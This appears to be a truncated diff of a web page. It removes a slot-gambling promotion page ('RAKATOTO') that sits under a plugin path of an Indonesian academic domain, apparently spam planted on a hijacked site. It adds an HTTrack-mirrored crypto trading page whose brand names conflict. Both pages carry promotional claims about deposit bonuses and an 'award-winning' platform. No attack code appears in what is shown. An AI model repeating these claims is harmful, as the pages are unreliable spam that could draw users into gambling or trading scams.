@@ -1,1813 +1,2114 @@
-<!doctype html>
-<html class="no-js" lang="en">
-  <head>
-    <meta name="google-site-verification" content="29cctb-jMZMM0Q7IYP6PxmpogQ7dWnr_-WyXCfNT3IA" />
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="theme-color" content="">
-    <link rel="canonical" href="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/">
-    <link rel="preconnect" href="https://fonts.shopifycdn.com" crossorigin>
-    <title>RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000</title>
-    <meta name="description" content="Rakatoto Juga Bonus dan promosi yang ditawarkan oleh RAKATOTO juga cukup menarik. Anda bisa mendapatkan bonus deposit sebesar 20% untuk setiap deposit yang Anda lakukan.">
-    <meta property="og:site_name" content="RAKATOTO">
-    <meta property="og:url" content="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/">
-    <meta property="og:title" content="RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000">
-    <meta property="og:type" content="product">
-    <meta property="og:description" content="Rakatoto Juga Bonus dan promosi yang ditawarkan oleh RAKATOTO juga cukup menarik. Anda bisa mendapatkan bonus deposit sebesar 20% untuk setiap deposit yang Anda lakukan.">
-    <meta property="og:image" content="https://iili.io/JRKigR4.md.jpg">
-    <meta property="og:image:secure_url" content="https://iili.io/JRKigR4.md.jpg/cdn/shop/files/slotgacor_72fcaf93-fde9-4e9e-8e09-3856fb47b5b1.jpg?v=1700538713">
-    <meta property="og:image:width" content="600"> 
-    <meta property="og:image:height" content="600">
-    <meta property="og:price:amount" content="2.500.000,00">
-    <meta property="og:price:currency" content="IDR">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000">
-    <meta name="twitter:description" content="Rakatoto Juga Bonus dan promosi yang ditawarkan oleh RAKATOTO juga cukup menarik. Anda bisa mendapatkan bonus deposit sebesar 20% untuk setiap deposit yang Anda lakukan.">
+﻿<!DOCTYPE html>
+<html lang="en" data-defaultlang="en">
+<!-- Mirrored from DigitalTradeMasters.com/ by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 01 Jan 2022 20:15:48 GMT -->
+<!-- Added by HTTrack -->
+
+<!-- Mirrored from digitaltrademasters.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 16 Dec 2023 16:42:12 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+
+<head>
+    <title>
+        NYIQCopytrade — No.1 Bitcoin Trading Platform | Trade Crypto, Forex,
+        CFD
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=1150; user-scalable=1;">
+
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <meta name="description"
+        content="Digital Trade Masters is an award-winning cryptocurrency trading platform that allows you to trade global markets including Crypto, Commodities, Indices, and Forex. Benefit from advanced trading tools, low fees, and instant order execution!" />
+    <meta name="keywords"
+        content="Digital Trade Masters, Bitcoin trading platform, Forex trading, CFD trading, Forex broker, margin trading" />
+    <meta name="format-detection" content="telephone=no" />
+    <!-- Opengraph-->
+    <meta property="og:title"
+        content="Digital Trade Masters — No.1 Bitcoin Trading Platform | Trade Crypto, Forex, CFD" />
+    <meta property="og:description"
+        content="Digital Trade Masters is an award-winning cryptocurrency trading platform that allows you to trade global markets including Crypto, Commodities, Indices, and Forex. Benefit from advanced trading tools, low fees, and instant order execution!" />
+    <meta property="og:image" content="index.html" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="index-2.html" />
+    <!-- Twitter Card data-->
+    <meta name="twitter:card" content="product" />
+    <meta name="twitter:site" content="index-2.html" />
+    <meta name="twitter:title"
+        content="Digital Trade Masters — No.1 Bitcoin Trading Platform | Trade Crypto, Forex, CFD" />
+    <meta name="twitter:description"
+        content="Digital Trade Masters is an award-winning cryptocurrency trading platform that allows you to trade global markets including Crypto, Commodities, Indices, and Forex. Benefit from advanced trading tools, low fees, and instant order execution!" />
+    <meta name="twitter:creator" content="Digital Trade Masters" />
+    <meta name="twitter:image" content="index.html" />
+    <link rel="dns-prefetch" href="https://api.NYIQCopytrade.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" />
+    <link rel="dns-prefetch" href="https://fonts.gstatic.com/" />
+
+    <link rel="icon" type="image/png" href="index.html" />
+
+    <script>
+    window.inlineConfig = {
+        demo: "https://web.NYIQCopytrade.com/",
+        api: "api.NYIQCopytrade.com",
+        maintenance: false,
+        enable_recaptcha: true,
+        production: true,
+        xdStorageUrl: "https://NYIQCopytrade.com/xd-storage",
+        country: "GB",
+        margin: "NYIQCopytrade.com/",
+        chart: "https://mobile-chart.NYIQCopytrade.com",
+        min_ios_build: 83,
+    };
+    </script>
+    <link rel="canonical" href="index-2.html" />
+    <link rel="alternate" hreflang="bn" href="index.html" />
+    <link rel="alternate" hreflang="zh-Hans" href="index.html" />
+    <link rel="alternate" hreflang="de" href="index.html" />
+    <link rel="alternate" hreflang="en" href="index-2.html" />
+    <link rel="alternate" hreflang="es" href="index.html" />
+    <link rel="alternate" hreflang="fr" href="index.html" />
+    <link rel="alternate" hreflang="hi" href="index.html" />
+    <link rel="alternate" hreflang="id" href="index.html" />
+    <link rel="alternate" hreflang="it" href="index.html" />
+    <link rel="alternate" hreflang="ja" href="index.html" />
+    <link rel="alternate" hreflang="kr" href="index.html" />
+    <link rel="alternate" hreflang="pt" href="index.html" />
+    <link rel="alternate" hreflang="ru" href="index.html" />
+    <link rel="alternate" hreflang="th" href="index.html" />
+    <link rel="alternate" hreflang="tr" href="index.html" />
+    <link rel="alternate" hreflang="vi" href="index.html" />
+    <meta name="msapplication-TileColor" content="#010a2e" />
+    <meta name="msapplication-TileImage" content="/assets/favicon/ms-icon-144x144.png?rev=2800934b" />
+    <meta name="theme-color" content="#010a32" />
+    <link href="commone171.css" rel="stylesheet" />
+    <link href="static/fonts/bitcoinfont.css" rel="stylesheet" />
+    <link href="index61f8.css" rel="stylesheet" />
+    <link href="glide.mindeac.css" rel="stylesheet" />
+    <script>
+    (function(w, d, s, l, i) {
+        w[l] = w[l] || [];
+        w[l].push({
+            "gtm.start": new Date().getTime(),
+            event: "gtm.js",
+        });
+        var f = d.getElementsByTagName(s)[0],
+            j = d.createElement(s),
+            dl = l != "dataLayer" ? "&l=" + l : "";
+        j.async = true;
+        j.src = "index.html" + i + dl;
+        f.parentNode.insertBefore(j, f);
+    })(window, document, "script", "dataLayer", "GTM-WM7CR6W");
+    </script>
+    <script>
+    window._adftrack = Array.isArray(window._adftrack) ?
+        window._adftrack :
+        window._adftrack ? [window._adftrack] : [];
+    window._adftrack.push({
+        pm: 1733920,
+    });
+    </script>
     <script type="application/ld+json">
-      {
-        "@context": "https://schema.org",
-        "@type": "NewsArticle",
-        "mainEntityOfPage": {
-          "@type": "WebPage",
-          "@id": "https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/"
-        },
-        "headline": "RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000",
-        "description": "Rakatoto Juga Bonus dan promosi yang ditawarkan oleh RAKATOTO juga cukup menarik. Anda bisa mendapatkan bonus deposit sebesar 20% untuk setiap deposit yang Anda lakukan.",
-        "image": ["https://iili.io/JRKigR4.md.jpg/cdn/shop/files/slotgacor_72fcaf93-fde9-4e9e-8e09-3856fb47b5b1.jpg"],
-        "author": {
-          "@type": "Organization",
-          "name": "RAKATOTO",
-          "url": "https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/"
-        },
-        "publisher": {
-          "@type": "Organization",
-          "name": "RAKATOTO",
-          "logo": {
-            "@type": "ImageObject",
-            "url": "https://iili.io/JRKigR4.md.jpg/cdn/shop/files/slotgacor_72fcaf93-fde9-4e9e-8e09-3856fb47b5b1.jpg"
-          }
-        },
-        "datePublished": "2023-11-20T07:49:19+00:00",
-        "dateModified": "2023-11-20T07:49:19+00:00"
-      }
+    {
+        "@context": "https://schema.org/",
+        "@type": "WebSite",
+        "name": "NYIQCopytrade",
+        "url": "https://NYIQCopytradecom",
+        "image": ["https://NYIQCopytrade.com/assets/images/og-image.jpg"],
+        "description": ""
+    }
     </script>
-	<script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/constants.js?v=58251544750838685771700311607" defer="defer"></script>
-    <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/pubsub.js?v=158358883527763999511700311616" defer="defer"></script>
-    <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/global.js?v=40820548392383841591700311609" defer="defer"></script>
-    <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/animations.js?v=88693664871331136111700311588" defer="defer"></script>
-    <script>
-      window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');
-    </script>
-    <meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/59231698991/digital_wallets/dialog">
-    <link rel="alternate" type="application/json+oembed" href="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/.oembed">
-    <script async="async" src="/checkouts/internal/preloads.js?locale=en-ID"></script>
-    <script id="shopify-features" type="application/json">
-      {
-        "accessToken": "f45b5e0afd089367099bc22e35228d5d",
-        "betas": ["rich-media-storefront-analytics"],
-        "domain": "0cc537-2.myshopify.com",
-        "predictiveSearch": true,
-        "shopId": 59231698991,
-        "smart_payment_buttons_url": "https:\/\/0cc537-2.myshopify.com\/cdn\/shopifycloud\/payment-sheet\/assets\/latest\/spb.en.js",
-        "dynamic_checkout_cart_url": "https:\/\/0cc537-2.myshopify.com\/cdn\/shopifycloud\/payment-sheet\/assets\/latest\/dynamic-checkout-cart.en.js",
-        "locale": "en",
-        "optimusEnabled": true,
-        "optimusHidden": false,
-        "betterDynamicCheckoutRecommendationVariant": "control",
-        "shopPromisePDPV3Enabled": false
-      }
-    </script>
-    <script>
-      var Shopify = Shopify || {};
-      Shopify.shop = "0cc537-2.myshopify.com";
-      Shopify.locale = "en";
-      Shopify.currency = {
-        "active": "IDR",
-        "rate": "1.0"
-      };
-      Shopify.country = "ID";
-      Shopify.theme = {
-        "name": "Dawn",
-        "id": 130538733615,
-        "theme_store_id": 887,
-        "role": "main"
-      };
-      Shopify.theme.handle = "null";
-      Shopify.theme.style = {
-        "id": null,
-        "handle": null
-      };
-      Shopify.cdnHost = "0cc537-2.myshopify.com/cdn";
-      Shopify.routes = Shopify.routes || {};
-      Shopify.routes.root = "/";
-    </script>
-    <script type="module">
-      ! function(o) {
-        (o.Shopify = o.Shopify || {}).modules = !0
-      }(window);
-    </script>
-    <script>
-      ! function(o) {
-        function n() {
-          var o = [];
 
-          function n() {
-            o.push(Array.prototype.slice.apply(arguments))
-          }
-          return n.q = o, n
-        }
-        var t = o.Shopify = o.Shopify || {};
-        t.loadFeatures = n(), t.autoloadFeatures = n()
-      }(window);
-    </script>
-    <script id="__st">
-      var __st = {
-        "a": 59231698991,
-        "offset": 25200,
-        "reqid": "fbb01e59-911d-49f8-bb6c-eacd088c9fe7",
-        "pageurl": "0cc537-2.myshopify.com\/products\/lsxgacor",
-        "u": "5ed1f5f52424",
-        "p": "product",
-        "rtyp": "product",
-        "rid": 7362949021743
-      };
-    </script>
-    <script>
-      window.ShopifyPaypalV4VisibilityTracking = true;
-    </script>
-    <script>
-      ! function(o) {
-        o.addEventListener("DOMContentLoaded", function() {
-          window.Shopify = window.Shopify || {}, window.Shopify.recaptchaV3 = window.Shopify.recaptchaV3 || {
-            siteKey: "6LcCR2cUAAAAANS1Gpq_mDIJ2pQuJphsSQaUEuc9"
-          };
-          var t = ['form[action*="/contact"] input[name="form_type"][value="contact"]', 'form[action*="/comments"] input[name="form_type"][value="new_comment"]', 'form[action*="/account"] input[name="form_type"][value="customer_login"]', 'form[action*="/account"] input[name="form_type"][value="recover_customer_password"]', 'form[action*="/account"] input[name="form_type"][value="create_customer"]', 'form[action*="/contact"] input[name="form_type"][value="customer"]'].join(",");
+    <script src="1_156_0/static/js/render.2cf8ac40b72f4491013b.js" async=""></script>
 
-          function n(e) {
-            e = e.target;
-            null == e || null != (e = function e(t, n) {
-              if (null == t.parentElement) return null;
-              if ("FORM" != t.parentElement.tagName) return e(t.parentElement, n);
-              for (var o = t.parentElement.action, r = 0; r < n.length; r++)
-                if (-1 !== o.indexOf(n[r])) return t.parentElement;
-              return null
-            }(e, ["/contact", "/comments", "/account"])) && null != e.querySelector(t) && ((e = o.createElement("script")).setAttribute("src", "https://cdn.shopify.com/shopifycloud/storefront-recaptcha-v3/v0.6/index.js"), o.body.appendChild(e), o.removeEventListener("focus", n, !0), o.removeEventListener("change", n, !0), o.removeEventListener("click", n, !0))
-          }
-          o.addEventListener("click", n, !0), o.addEventListener("change", n, !0), o.addEventListener("focus", n, !0)
-        })
-      }(document);
-    </script>
-    <script integrity="sha256-h4dvokWvGcvRSqiG7VnGqoonxF0k3NeoHPLSMjUGIz4=" data-source-attribution="shopify.loadfeatures" defer="defer" src="//0cc537-2.myshopify.com/cdn/shopifycloud/shopify/assets/storefront/load_feature-87876fa245af19cbd14aa886ed59c6aa8a27c45d24dcd7a81cf2d2323506233e.js" crossorigin="anonymous"></script>
-    <script integrity="sha256-HAs5a9TQVLlKuuHrahvWuke+s1UlxXohfHeoYv8G2D8=" data-source-attribution="shopify.dynamic-checkout" defer="defer" src="//0cc537-2.myshopify.com/cdn/shopifycloud/shopify/assets/storefront/features-1c0b396bd4d054b94abae1eb6a1bd6ba47beb35525c57a217c77a862ff06d83f.js" crossorigin="anonymous"></script>
-    <script id="sections-script" data-sections="header" defer="defer" src="//0cc537-2.myshopify.com/cdn/shop/t/1/compiled_assets/scripts.js?4"></script>
-    <style id="shopify-dynamic-checkout">
-      .shopify-payment-button__button--hidden {
-        visibility: hidden;
-      }
+    <style>
+    .goog-te-banner-frame.skiptranslate {
+        display: none !important;
+    }
 
-      .shopify-payment-button__button {
-        border-radius: 4px;
-        border: none;
-        box-shadow: 0 0 0 0 transparent;
-        color: white;
-        cursor: pointer;
-        display: block;
-        font-size: 1em;
-        font-weight: 500;
-        line-height: 1;
-        text-align: center;
-        width: 100%;
-        transition: background 0.2s ease-in-out;
-      }
+    body {
+        top: 0px !important;
+    }
 
-      .shopify-payment-button__button[disabled] {
-        opacity: 0.6;
-        cursor: default;
-      }
+    .goog-logo-link {
+        display: none !important;
+    }
 
-      .shopify-payment-button__button--unbranded {
-        background-color: #1990c6;
-        padding: 1em 2em;
-      }
-
-      .shopify-payment-button__button--unbranded:hover:not([disabled]) {
-        background-color: #136f99;
-      }
-
-      .shopify-payment-button__more-options {
-        background: transparent;
-        border: 0 none;
-        cursor: pointer;
-        display: block;
-        font-size: 1em;
-        margin-top: 1em;
-        text-align: center;
-        width: 100%;
-      }
-
-      .shopify-payment-button__more-options:hover:not([disabled]) {
-        text-decoration: underline;
-      }
-
-      .shopify-payment-button__more-options[disabled] {
-        opacity: 0.6;
-        cursor: not-allowed;
-      }
-
-      .shopify-payment-button__button--branded {
-        display: flex;
-        flex-direction: column;
-        min-height: 44px;
-        position: relative;
-        z-index: 1;
-      }
-
-      .shopify-payment-button__button--branded .shopify-cleanslate {
-        flex: 1 !important;
-        display: flex !important;
-        flex-direction: column !important;
-      }
-
-      .shopify-payment-button__button.button.loading {
-        position: relative;
-        color: transparent;
-      }
-
-      .shopify-payment-button__button.button.loading>.loading-overlay__spinner {
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        position: absolute;
-        height: 100%;
-        display: flex;
-        align-items: center;
-      }
-
-      .shopify-payment-button__button.button.loading>.loading-overlay__spinner .spinner {
-        width: -moz-fit-content;
-        width: fit-content;
-      }
-
-      .button.loading>.loading-overlay__spinner .path {
-        stroke: white;
-      }
-
-      .shopify-payment-button__button .loading-overlay__spinner {
-        width: 1.8rem;
-        display: inline-block;
-      }
-
-      .shopify-payment-button__button .spinner {
-        animation: shopify-rotator 1.4s linear infinite;
-      }
-
-      @keyframes shopify-rotator {
-        0% {
-          transform: rotate(0deg);
-        }
-
-        100% {
-          transform: rotate(270deg);
-        }
-      }
-
-      .shopify-payment-button__button .path {
-        stroke-dasharray: 280;
-        stroke-dashoffset: 0;
-        transform-origin: center;
-        stroke: rgb(18, 18, 18);
-        animation: shopify-dash 1.4s ease-in-out infinite;
-      }
-
-      @media screen and (forced-colors: active) {
-        .shopify-payment-button__button .path {
-          stroke: CanvasText;
-        }
-      }
-
-      @keyframes shopify-dash {
-        0% {
-          stroke-dashoffset: 280;
-        }
-
-        50% {
-          stroke-dashoffset: 75;
-          transform: rotate(135deg);
-        }
-
-        100% {
-          stroke-dashoffset: 280;
-          transform: rotate(450deg);
-        }
-      }
+    .trans-section {
+        margin: 100px;
+    }
     </style>
-    <script>
-      window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');
-    </script>
-    <style data-shopify>
-      @font-face {
-        font-family: Assistant;
-        font-weight: 400;
-        font-style: normal;
-        font-display: swap;
-        src: url("//0cc537-2.myshopify.com/cdn/fonts/assistant/assistant_n4.bcd3d09dcb631dec5544b8fb7b154ff234a44630.woff2?h1=MGNjNTM3LTIuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=295e40a6151b7b4f4339eabc434af396da7c59577647fb0a2967e7b2b830bbe0") format("woff2"),
-          url("//0cc537-2.myshopify.com/cdn/fonts/assistant/assistant_n4.a2d012304becc2a26f1ded1acc136fcab85c9afd.woff?h1=MGNjNTM3LTIuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=1bcf88a0f373b613b43485c070e5306f20277e22589a8d69c1dd8d614e39a6d8") format("woff");
-      }
-
-      @font-face {
-        font-family: Assistant;
-        font-weight: 700;
-        font-style: normal;
-        font-display: swap;
-        src: url("//0cc537-2.myshopify.com/cdn/fonts/assistant/assistant_n7.3335c7bdaddf2501ddab87cdbd9be98f3870e10d.woff2?h1=MGNjNTM3LTIuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=fdbcc903bffcb473d4ec9ba75cf76e10acf0507c943f8e8e4c5f9ac900acaaf8") format("woff2"),
-          url("//0cc537-2.myshopify.com/cdn/fonts/assistant/assistant_n7.7c85f5c5cc1555de92cc7ef2790ee3cffe5237f5.woff?h1=MGNjNTM3LTIuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=024229f91cb00264015d94888d0cc57ecf23208a16417b0b8016ee96af1e1cf4") format("woff");
-      }
-
-      @font-face {
-        font-family: Assistant;
-        font-weight: 400;
-        font-style: normal;
-        font-display: swap;
-        src: url("//0cc537-2.myshopify.com/cdn/fonts/assistant/assistant_n4.bcd3d09dcb631dec5544b8fb7b154ff234a44630.woff2?h1=MGNjNTM3LTIuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=295e40a6151b7b4f4339eabc434af396da7c59577647fb0a2967e7b2b830bbe0") format("woff2"),
-          url("//0cc537-2.myshopify.com/cdn/fonts/assistant/assistant_n4.a2d012304becc2a26f1ded1acc136fcab85c9afd.woff?h1=MGNjNTM3LTIuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=1bcf88a0f373b613b43485c070e5306f20277e22589a8d69c1dd8d614e39a6d8") format("woff");
-      }
-
-      :root,
-      .color-background-1 {
-        --color-background: 255, 255, 255;
-        --gradient-background: #FFFFFF;
-        --color-foreground: 18, 18, 18;
-        --color-background-contrast: 191, 191, 191;
-        --color-shadow: 18, 18, 18;
-        --color-button: 18, 18, 18;
-        --color-button-text: 255, 255, 255;
-        --color-secondary-button: 255, 255, 255;
-        --color-secondary-button-text: 18, 18, 18;
-        --color-link: 18, 18, 18;
-        --color-badge-foreground: 18, 18, 18;
-        --color-badge-background: 255, 255, 255;
-        --color-badge-border: 18, 18, 18;
-        --payment-terms-background-color: rgb(255 255 255);
-      }
-
-      .color-background-2 {
-        --color-background: 243, 243, 243;
-        --gradient-background: #F3F3F3;
-        --color-foreground: 18, 18, 18;
-        --color-background-contrast: 179, 179, 179;
-        --color-shadow: 18, 18, 18;
-        --color-button: 18, 18, 18;
-        --color-button-text: 243, 243, 243;
-        --color-secondary-button: 243, 243, 243;
-        --color-secondary-button-text: 18, 18, 18;
-        --color-link: 18, 18, 18;
-        --color-badge-foreground: 18, 18, 18;
-        --color-badge-background: 243, 243, 243;
-        --color-badge-border: 18, 18, 18;
-        --payment-terms-background-color: rgb(243 243 243);
-      }
-
-      .color-inverse {
-        --color-background: 36, 40, 51;
-        --gradient-background: #242833;
-        --color-foreground: 255, 255, 255;
-        --color-background-contrast: 47, 52, 66;
-        --color-shadow: 18, 18, 18;
-        --color-button: 255, 255, 255;
-        --color-button-text: 0, 0, 0;
-        --color-secondary-button: 36, 40, 51;
-        --color-secondary-button-text: 255, 255, 255;
-        --color-link: 255, 255, 255;
-        --color-badge-foreground: 255, 255, 255;
-        --color-badge-background: 36, 40, 51;
-        --color-badge-border: 255, 255, 255;
-        --payment-terms-background-color: rgb(36 40 51);
-      }
-
-      .color-accent-1 {
-        --color-background: 18, 18, 18;
-        --gradient-background: #121212;
-        --color-foreground: 255, 255, 255;
-        --color-background-contrast: 146, 146, 146;
-        --color-shadow: 18, 18, 18;
-        --color-button: 255, 255, 255;
-        --color-button-text: 18, 18, 18;
-        --color-secondary-button: 18, 18, 18;
-        --color-secondary-button-text: 255, 255, 255;
-        --color-link: 255, 255, 255;
-        --color-badge-foreground: 255, 255, 255;
-        --color-badge-background: 18, 18, 18;
-        --color-badge-border: 255, 255, 255;
-        --payment-terms-background-color: rgb(18 18 18);
-      }
-
-      .color-accent-2 {
-        --color-background: 51, 79, 180;
-        --gradient-background: #334FB4;
-        --color-foreground: 255, 255, 255;
-        --color-background-contrast: 23, 35, 81;
-        --color-shadow: 18, 18, 18;
-        --color-button: 255, 255, 255;
-        --color-button-text: 51, 79, 180;
-        --color-secondary-button: 51, 79, 180;
-        --color-secondary-button-text: 255, 255, 255;
-        --color-link: 255, 255, 255;
-        --color-badge-foreground: 255, 255, 255;
-        --color-badge-background: 51, 79, 180;
-        --color-badge-border: 255, 255, 255;
-        --payment-terms-background-color: rgb(51 79 180);
-      }
-
-      body,
-      .color-background-1,
-      .color-background-2,
-      .color-inverse,
-      .color-accent-1,
-      .color-accent-2 {
-        color: rgba(var(--color-foreground), 0.75);
-        background-color: rgb(var(--color-background));
-      }
-
-      :root {
-        --font-body-family: Assistant, sans-serif;
-        --font-body-style: normal;
-        --font-body-weight: 400;
-        --font-body-weight-bold: 700;
-        --font-heading-family: Assistant, sans-serif;
-        --font-heading-style: normal;
-        --font-heading-weight: 400;
-        --font-body-scale: 1.0;
-        --font-heading-scale: 1.0;
-        --media-padding: px;
-        --media-border-opacity: 0.05;
-        --media-border-width: 1px;
-        --media-radius: 0px;
-        --media-shadow-opacity: 0.0;
-        --media-shadow-horizontal-offset: 0px;
-        --media-shadow-vertical-offset: 4px;
-        --media-shadow-blur-radius: 5px;
-        --media-shadow-visible: 0;
-        --page-width: 120rem;
-        --page-width-margin: 0rem;
-        --product-card-image-padding: 0.0rem;
-        --product-card-corner-radius: 0.0rem;
-        --product-card-text-alignment: left;
-        --product-card-border-width: 0.0rem;
-        --product-card-border-opacity: 0.1;
-        --product-card-shadow-opacity: 0.0;
-        --product-card-shadow-visible: 0;
-        --product-card-shadow-horizontal-offset: 0.0rem;
-        --product-card-shadow-vertical-offset: 0.4rem;
-        --product-card-shadow-blur-radius: 0.5rem;
-        --collection-card-image-padding: 0.0rem;
-        --collection-card-corner-radius: 0.0rem;
-        --collection-card-text-alignment: left;
-        --collection-card-border-width: 0.0rem;
-        --collection-card-border-opacity: 0.1;
-        --collection-card-shadow-opacity: 0.0;
-        --collection-card-shadow-visible: 0;
-        --collection-card-shadow-horizontal-offset: 0.0rem;
-        --collection-card-shadow-vertical-offset: 0.4rem;
-        --collection-card-shadow-blur-radius: 0.5rem;
-        --blog-card-image-padding: 0.0rem;
-        --blog-card-corner-radius: 0.0rem;
-        --blog-card-text-alignment: left;
-        --blog-card-border-width: 0.0rem;
-        --blog-card-border-opacity: 0.1;
-        --blog-card-shadow-opacity: 0.0;
-        --blog-card-shadow-visible: 0;
-        --blog-card-shadow-horizontal-offset: 0.0rem;
-        --blog-card-shadow-vertical-offset: 0.4rem;
-        --blog-card-shadow-blur-radius: 0.5rem;
-        --badge-corner-radius: 4.0rem;
-        --popup-border-width: 1px;
-        --popup-border-opacity: 0.1;
-        --popup-corner-radius: 0px;
-        --popup-shadow-opacity: 0.05;
-        --popup-shadow-horizontal-offset: 0px;
-        --popup-shadow-vertical-offset: 4px;
-        --popup-shadow-blur-radius: 5px;
-        --drawer-border-width: 1px;
-        --drawer-border-opacity: 0.1;
-        --drawer-shadow-opacity: 0.0;
-        --drawer-shadow-horizontal-offset: 0px;
-        --drawer-shadow-vertical-offset: 4px;
-        --drawer-shadow-blur-radius: 5px;
-        --spacing-sections-desktop: 0px;
-        --spacing-sections-mobile: 0px;
-        --grid-desktop-vertical-spacing: 8px;
-        --grid-desktop-horizontal-spacing: 8px;
-        --grid-mobile-vertical-spacing: 4px;
-        --grid-mobile-horizontal-spacing: 4px;
-        --text-boxes-border-opacity: 0.1;
-        --text-boxes-border-width: 0px;
-        --text-boxes-radius: 0px;
-        --text-boxes-shadow-opacity: 0.0;
-        --text-boxes-shadow-visible: 0;
-        --text-boxes-shadow-horizontal-offset: 0px;
-        --text-boxes-shadow-vertical-offset: 4px;
-        --text-boxes-shadow-blur-radius: 5px;
-        --buttons-radius: 0px;
-        --buttons-radius-outset: 0px;
-        --buttons-border-width: 1px;
-        --buttons-border-opacity: 1.0;
-        --buttons-shadow-opacity: 0.0;
-        --buttons-shadow-visible: 0;
-        --buttons-shadow-horizontal-offset: 0px;
-        --buttons-shadow-vertical-offset: 4px;
-        --buttons-shadow-blur-radius: 5px;
-        --buttons-border-offset: 0px;
-        --inputs-radius: 0px;
-        --inputs-border-width: 1px;
-        --inputs-border-opacity: 0.55;
-        --inputs-shadow-opacity: 0.0;
-        --inputs-shadow-horizontal-offset: 0px;
-        --inputs-margin-offset: 0px;
-        --inputs-shadow-vertical-offset: 4px;
-        --inputs-shadow-blur-radius: 5px;
-        --inputs-radius-outset: 0px;
-        --variant-pills-radius: 40px;
-        --variant-pills-border-width: 1px;
-        --variant-pills-border-opacity: 0.55;
-        --variant-pills-shadow-opacity: 0.0;
-        --variant-pills-shadow-horizontal-offset: 0px;
-        --variant-pills-shadow-vertical-offset: 4px;
-        --variant-pills-shadow-blur-radius: 5px;
-      }
-
-      *,
-      *::before,
-      *::after {
-        box-sizing: inherit;
-      }
-
-      html {
-        box-sizing: border-box;
-        font-size: calc(var(--font-body-scale) * 62.5%);
-        height: 100%;
-      }
-
-      body {
-        display: grid;
-        grid-template-rows: auto auto 1fr auto;
-        grid-template-columns: 100%;
-        min-height: 100%;
-        margin: 0;
-        font-size: 1.5rem;
-        letter-spacing: 0.06rem;
-        line-height: calc(1 + 0.8 / var(--font-body-scale));
-        font-family: var(--font-body-family);
-        font-style: var(--font-body-style);
-        font-weight: var(--font-body-weight);
-      }
-
-      @media screen and (min-width: 750px) {
-        body {
-          font-size: 1.6rem;
-        }
-      }
-    </style>
-    <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/base.css?v=22615539281115885671700311588" rel="stylesheet" type="text/css" media="all" />
-    <link rel="preload" as="font" href="//0cc537-2.myshopify.com/cdn/fonts/assistant/assistant_n4.bcd3d09dcb631dec5544b8fb7b154ff234a44630.woff2?h1=MGNjNTM3LTIuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=295e40a6151b7b4f4339eabc434af396da7c59577647fb0a2967e7b2b830bbe0" type="font/woff2" crossorigin>
-    <link rel="preload" as="font" href="//0cc537-2.myshopify.com/cdn/fonts/assistant/assistant_n4.bcd3d09dcb631dec5544b8fb7b154ff234a44630.woff2?h1=MGNjNTM3LTIuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=295e40a6151b7b4f4339eabc434af396da7c59577647fb0a2967e7b2b830bbe0" type="font/woff2" crossorigin>
-    <link rel="stylesheet" href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-predictive-search.css?v=118923337488134913561700311602" media="print" onload="this.media='all'">
-    <script>
-      document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
-      if (Shopify.designMode) {
-        document.documentElement.classList.add('shopify-design-mode');
-      }
-    </script>
-    <link href="https://monorail-edge.shopifysvc.com" rel="dns-prefetch">
-    <script>
-      (function() {
-        if ("sendBeacon" in navigator && "performance" in window) {
-          var session_token = document.cookie.match(/_shopify_s=([^;]*)/);
-
-          function handle_abandonment_event(e) {
-            var entries = performance.getEntries().filter(function(entry) {
-              return /monorail-edge.shopifysvc.com/.test(entry.name);
-            });
-            if (!window.abandonment_tracked && entries.length === 0) {
-              window.abandonment_tracked = true;
-              var currentMs = Date.now();
-              var navigation_start = performance.timing.navigationStart;
-              var payload = {
-                shop_id: 59231698991,
-                url: window.location.href,
-                navigation_start,
-                duration: currentMs - navigation_start,
-                session_token: session_token && session_token.length === 2 ? session_token[1] : "",
-                page_type: "product"
-              };
-              window.navigator.sendBeacon("https://monorail-edge.shopifysvc.com/v1/produce", JSON.stringify({
-                schema_id: "online_store_buyer_site_abandonment/1.1",
-                payload: payload,
-                metadata: {
-                  event_created_at_ms: currentMs,
-                  event_sent_at_ms: currentMs
-                }
-              }));
-            }
-          }
